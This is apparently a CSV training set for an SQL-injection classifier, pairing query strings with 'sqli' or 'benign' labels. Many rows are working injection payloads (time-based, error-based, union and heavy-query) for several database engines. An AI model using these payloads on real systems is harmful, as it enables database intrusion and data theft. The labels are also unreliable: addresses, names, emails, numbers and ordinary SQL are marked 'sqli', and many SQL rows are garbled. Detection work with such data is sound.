query,label
"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",sqli
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,sqli
bili,sqli
1  )   as ryks where 1196  =  1196,sqli
"  SELECT Orders.eightrID, Employees.necessary, Employees.stranger FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.withID ORDER BY Orders.writeID",sqli
" select * from users where id  =  1 or 1#""@ union select null,version  (    )   -- 1",sqli
longo,sqli
3339,sqli
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c885367717' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",sqli
SELECT liquid FROM battle UNION ALL SELECT football FROM becoming ORDER BY thumb,sqli
"-7776'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'ihof'  =  'ihof",sqli
"1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924",sqli
villamuera de la cueza,sqli
SELECT DISTINCT frame FROM write,sqli
belonne santaella,sqli
SELECT COUNT ( palaceID ) FROM went,sqli
"1%""  )   and sleep  (  5  )   and   (  ""%""  =  """,sqli
artenio,sqli
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and 'yfkk'  =  'yfkk",sqli
1'   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  'acml' like 'acml,sqli
90179643r,sqli
   )    )    or sleep  (  __TIME__  )    =  ',sqli
1366,sqli
poblacin de arroyo,sqli
9.82891E+015,sqli
SELECT * FROM happened WHERE rice = 'giant',sqli
"c/ paterna, s/n, 11h",sqli
-7562  )   or 8571  =  8571--,sqli
llasera,sqli
"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'swua' like 'swua",sqli
SELECT * FROM minerals WHERE    NOT old = 'down',sqli
SELECT AVG ( pattern ) FROM pink SELECT SUM ( soon ) ,sqli
SELECT Count ( * )  AS ourselves,sqli
"-2122""  )   as zytb where 7025  =  7025 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",sqli
1' where 2134  =  2134 rlike   (  select   (  case when   (  3613  =  2090  )   then 1 else 0x28 end   )    )   --,sqli
alcolea,sqli
SELECT COUNT ( butID ) FROM film,sqli
1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    ) ,sqli
"  SELECT SUBSTRING_INDEX ( ""www.w3schools.com"", ""."", 2 ) ;",sqli
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,sqli
"1%""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  -- huss",sqli
re681g48rdia,sqli
1'   )    )     )   rlike sleep  (  5  )   and    (    (     (  'zwyx'  =  'zwyx,sqli
"-7579%"" or 6570  =  1764",sqli
1'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,sqli
SELECT * FROM comfortable WHERE figure = 'production'  AND City = 'wrong',sqli
SELECT TOP 3 * FROM printed SELECT * FROM watch 3SELECT * FROM believed,sqli
SELECT pot FROM promised,sqli
"1' where 1895  =  1895 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
88918773z,sqli
ad0inist1ador9,sqli
"c/ plza. 18, 6-e",sqli
iza,sqli
"1%'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  '%'  =  '",sqli
"-5903%""   )    )     )   or 3038  =  3038",sqli
SELECT blanket ( s ) FROM standard INNER JOIN,sqli
SELECT hay ( s )  FROM congress UNION,sqli
3xp2n18va,sqli
"  SELECT pleasureID AS ID, color AS shelf FROM date",sqli
DELETE FROM lead WHERE thus = 'trouble',sqli
1'+  (  select 'leok' where 4320  =  4320,sqli
and 1 in   (  select var from temp  )  --,sqli
SELECT * FROM treated WHERE motor = 'slight'  AND  ( accept = 'sink' OR read = 'leave' ) ,sqli
SELECT AVG ( apartment ) FROM thy,sqli
-1277'   )    )     )   order by 1--,sqli
28%,sqli
SELECT * FROM touch 3 SELECT * FROM military,sqli
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",sqli
calle carlos arniches 173,sqli
SELECT ran ( s )  FROM rising UNION ALL,sqli
37766,sqli
" SELECT * FROM choose ORDER BY finger, entirely",sqli
SELECT AVG ( nails ) FROM principal SELECT SUM ( lungs ) ,sqli
waring,sqli
SELECT AVG ( melted ) FROM greatly,sqli
"altos de lillo, 137",sqli
tchjan-lian.quadflieg@comerciosdeaspe.se,sqli
SELECT task ( s )  FROM adult UNION,sqli
termmetro,sqli
"  SELECT * FROM egg WHERE express IN  ( 'correctly', 'fur', 'car' )  ",sqli
1' and 6621  =  4681--,sqli
" SELECT column_name ( s )  FROM our,limited",sqli
-6712'   )    )    as kqff where 9146  =  9146 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,sqli
"regimiento, 114,",sqli
1206130000000000,sqli
"1'  )   as irsh where 4973  =  4973 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
arjona,sqli
SELECT COUNT ( pick ) FROM stop,sqli
"-8844""   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",sqli
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'ulkq'  =  'ulkq,sqli
 (  s,sqli
3243630000000000,sqli
"-7485%'   )    )     )   union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",sqli
choclo,sqli
DELETE FROM users WHERE created_at < '2023-07-24',benign
"c/ de las gloxinias 91,",sqli
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 289969 )  ORDER BY meta_id ASC",sqli
59072549q,sqli
1  )   as wiyx where 6515  =  6515,sqli
-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,sqli
"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'sqnk'  =  'sqnk",sqli
6ncanta33n,sqli
10960,sqli
1'||  (  select 'tezo' from dual where 4436  =  4436,sqli
63947168s,sqli
chuchazo,sqli
SELECT go ( s )  FROM remarkable,sqli
campanini-adamson@barebackspain.kh,sqli
"1   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   3626  =  3626",sqli
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,sqli
japan,sqli
"SELECT option_name, option_value FROM wp_options WHERE autoload  =  'yes'",sqli
SELECT Count ( * )  AS is,sqli
econmicamente,sqli
SELECT * FROM future WHERE NOT stream = 'replace'  AND NOT call = 'pay',sqli
"   SELECT underline,in,whispered,eight,brave     (  (  command JOIN rise ON jar.bank =  strong.heavy )   INNER JOIN oceanON Orders.crew =  frighten.chanceID ) ",sqli
SELECT * FROM shelter,sqli
1   )    )    as rbcf where 1053  =  1053,sqli
8812120000000000,sqli
"1'||  (  select 'bnaz' from dual where 7168  =  7168 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
select sleep  (  5  )   and    (    (   'uyft'  =  'uyft,sqli
"1'   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   'fgox' like 'fgox",sqli
 or '1'   =   '1,sqli
SELECT went ( s )  FROM using LEFT JOIN,sqli
-8447 where 2850  =  2850 or 7147  =  3262,sqli
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,sqli
SELECT * FROM atom 3 SELECT * FROM immediately,sqli
32170,sqli
"1  )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",sqli
-5547' or 9323  =  9323#,sqli
gater9,sqli
"1'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  'ckfn' like 'ckfn",sqli
SELECT COUNT ( he )  FROM clothing,sqli
" SELECT * FROM once ORDER BY bee ASC, allow DESC",sqli
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",sqli
"1"" and sleep  (  5  )  ",sqli
santaren,sqli
17867,sqli
SELECT * FROM keep WHERE wheel = 'sharp' LIMIT 3,sqli
"   SELECT evening,disappear,planet,pony,plain     (  (  ability JOIN teeth ON beauty.stopped =  high.duty )   INNER JOIN volumeON Orders.bite =  meant.watchID ) ",sqli
SELECT * FROM melted WHERE Price NOT BETWEEN 10 AND 20,sqli
SELECT * FROM nation WHERE job = 'roll' LIMIT 3,sqli
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""soyg""  =  ""soyg",sqli
doriot,sqli
"1""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
philip7,sqli
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'vvxk'  =  'vvxk,sqli
 UPDATE rocky SET swim = 'doll'WHERE vegetable = 'frame',sqli
fazenda_heigh@unanuevavisionenortodoncia.gh,sqli
37759460s,sqli
SELECT * FROM can  WHERE widely NOT LIKE '[meant]%',sqli
SELECT * FROM wp_posts WHERE ID  =  347696 LIMIT 1,sqli
SELECT * FROM  ( SELECT atmosphere FROM quite ) ,sqli
SELECT AVG ( nose ) FROM lower,sqli
"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",sqli
SELECT MIN ( conversation )  AS region FROM troops,sqli
"-6086"" union all select 8700,8700,8700,8700--",sqli
"1' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
select   (  case when   (  8113  =  8981  )   then 8113 else 1/  (  select 0  )   end  )  --,sqli
"  SELECT Orders.windowrID, Employees.none, Employees.believed FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.freeID ORDER BY Orders.courageID",sqli
slavova@costablancarental.ug,sqli
978,sqli
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 365884 )  ORDER BY meta_id ASC",sqli
telma,sqli
equilibrio,sqli
"-6093'  )   where 9676  =  9676 union all select 9676,9676,9676,9676,9676,9676--",sqli
5854370000000000,sqli
21292,sqli
"-4869%' union all select 5729,5729,5729--",sqli
" select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",sqli
1 where 2301  =  2301,sqli
pincel,sqli
SELECT TOP 3 * FROM safety,sqli
SELECT object FROM important,sqli
"1%""  )   or elt  (  6272  =  6272,sleep  (  5   )    )    and   (  ""%""  =  """,sqli
"1"" where 8918  =  8918   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",sqli
c/ rivera de los limonetes 98,sqli
end and   (  'jzlr'  =  'jzlr,sqli
d75a4r45der,sqli
dowson@sehimaco.eg,sqli
gonzalvo gorriti,sqli
" select * from users where id  =  1 or   (  1  )    =  1 union select 1,banner from v$version where rownum  =  1 -- 1",sqli
conceptear,sqli
"1""  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  ""tgdu""  =  ""tgdu",sqli
30555153k,sqli
nina,sqli
SELECT TOP 3 * FROM heavy SELECT * FROM hide 3SELECT * FROM are,sqli
SELECT * FROM birds  WHERE sum = substance,sqli
tabanera de cerrato,sqli
"  SELECT circleID AS ID, stove AS headed FROM thing",sqli
47160,sqli
671271000000000,sqli
"-5431""   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""ipmo""  =  ""ipmo",sqli
1%' union all select null--,sqli
5338280000000000,sqli
SELECT shop ( s )  FROM front UNION,sqli
fla,sqli
SELECT AVG ( nine )  FROM actually  SELECT SUM ( writer ) ,sqli
1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,sqli
10970,sqli
SELECT * FROM gently  WHERE relationship NOT LIKE '[steep]%',sqli
 (  select   (  case when   (  9337  =  9337  )   then waitfor delay '0:0:5' else 9337*  (  select 9337 from master..sysdatabases  )   end   )    ) ,sqli
SELECT AVG ( pale ) FROM suppose SELECT SUM ( drive ) ,sqli
"1 or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
"1"" and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""vzud"" like ""vzud",sqli
sowry,sqli
SELECT * FROM write FETCH FIRST 3 ROWS ONLY,sqli
waitfor delay '0:0:5' and   (  4614  =  4614,sqli
"1'   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'lyem' like 'lyem",sqli
"1%' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '%'  =  '",sqli
20048048y,sqli
1%'  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,sqli
SELECT * FROM  ( SELECT shake FROM tea ) ,sqli
SELECT from ( s )  FROM duty,sqli
1   )    )    as zpvn where 2767  =  2767 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,sqli
select   (  case when   (  6435  =  8988  )   then 6435 else 6435*  (  select 6435 from information_schema.character_sets  )   end  )  #,sqli
"1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",sqli
"1  )   where 2781  =  2781 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",sqli
"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  'xkxi' like 'xkxi",sqli
salillas de jaln,sqli
SELECT * FROM  ( SELECT rain FROM lion ) ,sqli
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""xxug""  =  ""xxug",sqli
SELECT * FROM arrange ORDER BY southern DESC,sqli
"-5779  )   union all select 6089,6089--",sqli
SELECT AVG ( vowel ) FROM trade SELECT SUM ( plates ) ,sqli
"1""  )   where 6903  =  6903",sqli
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",sqli
SELECT * FROM happened WHERE carefully BETWEEN '1996-07-01' AND '1996-07-31',sqli
bernab,sqli
SELECT count ( s )  FROM center LEFT JOIN,sqli
"1'  )   where 6387  =  6387 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
alcalde manuel de la pinta s/n 13?f,sqli
urrutia delems,sqli
1' where 6359  =  6359 and   (  3020  =  3020  )  *6703--,sqli
"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",sqli
1'+  (  select qugu where 2287  =  2287 order by 1#,sqli
"1' in boolean mode  )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
1   )    )     )   union all select null#,sqli
neira umbert,sqli
select sleep  (  5  )   and    (    (   'mmvf' like 'mmvf,sqli
SELECT * FROM globe ORDER BY palace DESC,sqli
haslund@arvigar.sl,sqli
"  SELECT transportation,child FROM furniture WHERE other = 'poetry' UNION SELECT dry, act FROM plate",sqli
"1'||  (  select 'scwx' where 6591  =  6591 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",sqli
39499084b,sqli
"1""  )   where 4588  =  4588",sqli
"""  )   or   (  ""x""  )    =    (  ""x",sqli
cracoviano,sqli
"1%'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  '%'  =  '",sqli
SELECT AVG ( itself ) FROM choose SELECT SUM ( this ) ,sqli
SELECT TOP 50 PERCENT * FROM neighbor SELECT * FROM bone FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM shoot,sqli
heidi,sqli
"  SELECT Orders.hiddenrID, Employees.bone, Employees.safe FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.planID ORDER BY Orders.frequentlyID",sqli
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',sqli
DELETE FROM users WHERE created_at < '2023-07-05',benign
"1   )    )     )   union all select null,null,null,null,null,null--",sqli
SELECT news ( s )  FROM seven,sqli
"1 and make_set  (  9681  =  4703,4703  )  # zbrf",sqli
"1 where 3902  =  3902 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
SELECT TOP 50 PERCENT * FROM honor SELECT * FROM dog FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM steep,sqli
SELECT TOP 3 * FROM moving,sqli
"cardenal mendoza s/n, 7?h",sqli
SELECT * FROM manufacturing WHERE wooden NOT LIKE '[difference]%',sqli
SELECT * FROM nearest  WHERE still = save,sqli
"1%'   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  '%'  =  '",sqli
19219,sqli
32493489d,sqli
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and ""dsae""  =  ""dsae",sqli
SELECT * FROM noon WHERE combine IN  ( SELECT satellites FROM whom ) ,sqli
SELECT TOP 3 * FROM solve WHERE snow = 'possible',sqli
SELECT vote FROM strange,sqli
"  SELECT tightID AS ID, bar AS easier FROM consist",sqli
"  SELECT TIMEDIFF ( ""2017-06-25 13:10:11"", ""2017-06-15 13:10:10"" ) ;",sqli
SELECT * FROM new WHERE cloth = 'daughter'  AND City = 'given',sqli
"1%""   )    )     )   or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
SELECT AVG ( moon ) FROM saw SELECT SUM ( concerned ) ,sqli
doan7,sqli
SELECT AVG ( consist ) FROM getting SELECT SUM ( pen ) ,sqli
"  SELECT * FROM very WHERE found IN  ( 'wash', 'struck', 'powerful' )  ",sqli
-4215  )   where 5782  =  5782 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,sqli
desiree,sqli
alfajarn,sqli
SELECT * FROM identity WHERE burn BETWEEN '1996-07-01' AND '1996-07-31',sqli
demarco_phuong@beesmer.me,sqli
SELECT AVG ( congress ) FROM mirror,sqli
"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",sqli
25938703q,sqli
or 1  =  1/*,sqli
"1'   )    )    union all select null,null,null,null,null--",sqli
"1""   )    )    waitfor delay '0:0:5'--",sqli
"  SELECT moreID AS ID, studied AS social FROM movement",sqli
96110955g,sqli
SELECT * FROM angry WHERE foreign IN  ( SELECT smallest FROM separate ) ,sqli
SELECT sea ( s FROM consider RIGHT JOIN,sqli
"1,iif  (  7475  =  7475,1,1/0  )  ",sqli
43391,sqli
"calle monte miramar, s/n",sqli
" select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",sqli
"select count  (  *  )   from generate_series  (  1,5000000  )   and 'fahy' like 'fahy",sqli
es518l132n,sqli
SELECT AVG ( aware ) FROM ship,sqli
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct,sqli
boggs@cocteleria.dz,sqli
1'+  (  select 'rpds' where 5870  =  5870 and 4595  =  4595#,sqli
SELECT TOP 50 PERCENT * FROM wear SELECT * FROM parent FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM difficult,sqli
jochim@ajuntamentdebarcelona2-0.qa,sqli
SELECT * FROM doll WHERE    NOT shaking = 'soon',sqli
"1""   )    )     )   and 7533  =  7533 and    (    (     (  ""alvd"" like ""alvd",sqli
"1""  )   as tecq where 4817  =  4817 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",sqli
SELECT * FROM rest ORDER BY constantly,sqli
-2351   )    )    as xdqn where 4019  =  4019 or 8571  =  8571--,sqli
"-5780 or make_set  (  3464  =  4518,4518  )  -- icit",sqli
SELECT COUNT ( took ) FROM sitting,sqli
SELECT Count ( * )  AS father,sqli
SELECT farm FROM back UNION SELECT were FROM band ORDER BY ran,sqli
"1%""   )    )    rlike sleep  (  5  )  #",sqli
SELECT * FROM independent WHERE including = 'sell' LIMIT 3,sqli
schauer,sqli
SELECT * FROM recognize ORDER BY floor DESC,sqli
nikolia,sqli
alcarrs,sqli
"   SELECT COUNT ( here ) , silver FROM double BY toy",sqli
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""pdqm"" like ""pdqm",sqli
"1""   )    )    as nlgn where 3834  =  3834 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"1   )    )    as hrks where 7637  =  7637 or elt  (  6272  =  6272,sleep  (  5   )    )   --",sqli
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",sqli
"1%'   )    )    and elt  (  4483  =  5364,5364  )   and    (    (   '%'  =  '",sqli
SELECT * FROM fox FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM bread,sqli
moretti alegre,sqli
"1""  )   and 2954  =  1256--",sqli
SELECT * FROM wp_posts WHERE ID  =  262311 LIMIT 1,sqli
SELECT * FROM lose WHERE hour = 'distance',sqli
sinesio,sqli
"1""   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
"   SELECT Employees.can, COUNT ( Orders.shakingID )  AS waitFROM    ( OrdersINNER JOIN dull ON Orders.tiredID  =  Employees.saddleID ) ",sqli
